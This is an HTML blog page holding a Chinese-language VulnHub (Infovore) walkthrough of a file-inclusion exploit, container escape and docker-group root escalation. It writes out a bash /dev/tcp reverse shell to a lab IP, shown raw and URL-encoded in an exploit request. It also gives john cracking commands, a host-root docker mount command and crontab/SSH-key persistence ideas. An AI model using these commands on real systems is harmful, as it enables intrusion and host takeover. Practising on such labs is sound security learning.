@@ -1,0 +1,283 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>docker提权 | xiaomao</title>
+<link rel="shortcut icon" href="https://xiaomaoq.github.io//favicon.ico?v=1742647247277">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://xiaomaoq.github.io//styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="docker提权 | xiaomao - Atom Feed" href="https://xiaomaoq.github.io//atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="环境
+重点是后面拿到shell后的docker提权部分
+环境:https://www.vulnhub.com/entry/infovore-1,496/
+https://mp.weixin.qq.com/s/7RWgYGyiK-CEN508..." />
+    <meta name="keywords" content="vulnhub,打靶,提权" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://xiaomaoq.github.io/">
+  <img class="avatar" src="https://xiaomaoq.github.io//images/avatar.png?v=1742647247277" alt="">
+  </a>
+  <h1 class="site-title">
+    xiaomao
+  </h1>
+  <p class="site-description">
+    取法乎上，仅得其中<br>
+取法乎中，仅得其下
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="https://xiaomaoq.github.io/guan-yu" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              docker提权
+            </h2>
+            <div class="post-info">
+              <span>
+                2024-03-09
+              </span>
+              <span>
+                5 min read
+              </span>
+              
+                <a href="https://xiaomaoq.github.io/SARbZmWC9/" class="post-tag">
+                  # vulnhub
+                </a>
+              
+                <a href="https://xiaomaoq.github.io/sYnh9qvSqV/" class="post-tag">
+                  # 打靶
+                </a>
+              
+                <a href="https://xiaomaoq.github.io/deS5hM8TF/" class="post-tag">
+                  # 提权
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="环境">环境</h1>
+<p>重点是后面拿到shell后的docker提权部分</p>
+<p>环境:https://www.vulnhub.com/entry/infovore-1,496/</p>
+<p>https://mp.weixin.qq.com/s/7RWgYGyiK-CEN508eB8BEg</p>
+<p>难受啊 找exp找了一下午 其实一开始用的可以 执行命令少了个;  然后弹shell也一直弹不上 最后按着小迪一个一个敲。。</p>
+<h3 id="内容">内容</h3>
+<ul>
+<li>文件包含</li>
+<li>docker逃逸</li>
+<li>docker提权</li>
+</ul>
+<h1 id="操作">操作</h1>
+<p>常规 主机发现 端口扫描 	开放了80端口     也没啥东西</p>
+<h2 id="文件包含-参数爆破">文件包含 参数爆破</h2>
+<p>然后目录扫描 也啥东西     然后他的 80端口的主页面的title是 include me   就想到了文件包含</p>
+<p>但是不知道他的参数名    =&gt; 用burp去爆破      从扫描的结果得知存在 info.php 去包含这个   响应长度不一样   再去看他的页面是空白的  很奇怪啊不应该是主要啊</p>
+<figure data-type="image" tabindex="1"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403082016131.png" alt="image-20240308201605077" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403082016724.png" alt="image-20240308201637688" loading="lazy"></figure>
+<figure data-type="image" tabindex="3"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403082017548.png" alt="image-20240308201706513" loading="lazy"></figure>
+<p>这个包含有点迷糊啊  为啥我包含info.php 页面显示是空白嘞</p>
+<h2 id="漏洞利用">漏洞利用</h2>
+<p>已获得phpinfo和文件包含漏洞可以尝试远程代码执行</p>
+<p>md 找着exp找了几小时 然后tmd 重新回到课程里面看到。。。然后tmd少了个分号</p>
+<p>exp =&gt;https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py</p>
+<p>' bash -c &quot;exec bash -i &gt;/dev/tcp/192.168.3.128/9000 0&gt;&amp;1&quot; '            //要编码</p>
+<p>http://192.168.3.116/index.php?filename=/tmp/g&amp;1=system(%27bash%20-c%20%22exec%20bash%20-i%20%3E%26%20%2fdev%2ftcp%2f192.168.3.128%2f9000%200%3E%261%22%27);</p>
+<p>执行exp  然后再反弹shell</p>
+<h1 id="提权">提权</h1>
+<h2 id="docker逃逸">docker逃逸</h2>
+<p>拿到shell 后  去到根目录   ls -a    看到  .dockerenv  就知道现在拿到得是一个dockr环境下的权限</p>
+<figure data-type="image" tabindex="4"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403092038901.png" alt="image-20240309203802870" loading="lazy"></figure>
+<p>hostname 也可以判断</p>
+<figure data-type="image" tabindex="5"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403092039614.png" alt="image-20240309203949588" loading="lazy"></figure>
+<p>现在要逃逸出docker容器</p>
+<p>复制.oldkeys.tgz到tmp目录下，解压缩文件查看内容，发现私钥</p>
+<p>cp /.oldkeys.tgz /tmp/.oldkeys.tgz</p>
+<p>tar -xvf   .oldkeys.tgz</p>
+<figure data-type="image" tabindex="6"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403092046648.png" alt="image-20240309204639624" loading="lazy"></figure>
+<p>复制root内容到kali  用john进行解密   破解出一个密码   choclate93</p>
+<p>使用 john 的一个脚本把私钥转换成 john 可识别的 ssh 密钥文件：<br>
+/usr/share/john/ssh2john.py id_rsa &gt; hash1</p>
+<p>使用 john 爆破密码<br>
+john hash1 --wordlist=/usr/share/wordlists/rockyou.txt</p>
+<figure data-type="image" tabindex="7"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403092057609.png" alt="image-20240309205727555" loading="lazy"></figure>
+<p>尝试su到root</p>
+<figure data-type="image" tabindex="8"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403092059307.png" alt="image-20240309205922276" loading="lazy"></figure>
+<p>但是我们现在的root  也只是docker容器的root    要逃离docker</p>
+<p>.ssh在root目录啊 (找半天)</p>
+<figure data-type="image" tabindex="9"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403092105040.png" alt="image-20240309210529019" loading="lazy"></figure>
+<p>查看  id_rsa.pub时候发现一个admin账号  这应该是 本机的了   试着用密钥对连接  看到有公钥和私钥了   <img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403092108086.png" alt="image-20240309210802038" loading="lazy"></p>
+<h2 id="利用docker提权">利用docker提权</h2>
+<p>用 /bin/bash -i  得到新的shell终端</p>
+<p>su -P - root 切换root用户配置相同的环境，再次登录ssh，成功</p>
+<p>开始我直接su root  然后操作失败了  (前面还要 export TERM=xterm)</p>
+<figure data-type="image" tabindex="10"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403092203622.png" alt="image-20240309220302576" loading="lazy"></figure>
+<p>ssh admin@192.168.150.1 -i id_rsa   要输入密码 这里用到前面的密码  也可以 像前面一样 搞到本机去破解</p>
+<figure data-type="image" tabindex="11"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403092158342.png" alt="image-20240309215859291" loading="lazy"></figure>
+<p>成功拿到了一个本机用户权限  想办法提到root     看到这个用户在docker组里面   用docker提权  挂载目录</p>
+<figure data-type="image" tabindex="12"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403092206084.png" alt="image-20240309220601061" loading="lazy"></figure>
+<p><code>docker run -v /:/mnt -it alpine</code> 	 //  从Docker上面下载alpine镜像,然后运行;将容器<strong>外部的目录/<strong>挂载到</strong>容器内部/mnt</strong></p>
+<figure data-type="image" tabindex="13"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403092208928.png" alt="image-20240309220818886" loading="lazy"></figure>
+<figure data-type="image" tabindex="14"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403092214714.png" alt="image-20240309221427683" loading="lazy"></figure>
+<p>这个时候又来到了docker里面  权限是root 这是我们启动docker   挂载了目录   通过这个我们可以看到真机root里面有什么而且还可以写</p>
+<p>但是在这 我们反弹shell  得到的shell任然是docker容器的root权限</p>
+<p>进入docker控制终端  /mnt就等于操作真机目录    借助目录写入计划任务或者读取密钥破解等方式进行权限交换</p>
+<p>我们要得到真机的root权限的方法（拿到真机的shell</p>
+<ul>
+<li>破解 /etc/shadow</li>
+<li>写ssh密钥到宿主机(真机)                  openssl 靶机好像没有    （生成个密码 替换root原来的密码</li>
+<li>写计划任务到宿主机      /mnt/etc/crontab   =   /etc/crontab   https://zhuanlan.zhihu.com/p/591578734</li>
+<li>CVE漏洞直接利用 反弹shell</li>
+</ul>
+<p>破解 shadow 密钥  john   ( cpu直接100%)</p>
+<figure data-type="image" tabindex="15"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403092221474.png" alt="image-20240309222113448" loading="lazy"></figure>
+<h1 id="总结">总结</h1>
+<p>打了一天了  拿shell那里 一直打不通 乌鱼子</p>
+<p>但是重点是在后面的docker提权部分</p>
+<p>拿本靶机来说</p>
+<p>一开始得到的shell是在docker里面  然后破解密钥得到了 docker里面的root权限</p>
+<p>然后又通过ssh  连接到了真机的普通用户   而且在docker组里</p>
+<p>通过docker 挂载目录 进入docker 得到了一个docker的root权限</p>
+<p>但是我们可以访问到真机的root等目录  可以通过写计划任务 破解密钥   来拿到真机的root权限的shell</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E7%8E%AF%E5%A2%83">环境</a><br>
+*
+<ul>
+<li><a href="#%E5%86%85%E5%AE%B9">内容</a></li>
+</ul>
+</li>
+<li><a href="#%E6%93%8D%E4%BD%9C">操作</a>
+<ul>
+<li><a href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-%E5%8F%82%E6%95%B0%E7%88%86%E7%A0%B4">文件包含 参数爆破</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">漏洞利用</a></li>
+</ul>
+</li>
+<li><a href="#%E6%8F%90%E6%9D%83">提权</a>
+<ul>
+<li><a href="#docker%E9%80%83%E9%80%B8">docker逃逸</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8docker%E6%8F%90%E6%9D%83">利用docker提权</a></li>
+</ul>
+</li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://xiaomaoq.github.io/vulnhub-ba-ji-evilbox/">
+              <h3 class="post-title">
+                0x06-VulnHub靶机-EvilBox
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://xiaomaoq.github.io//atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
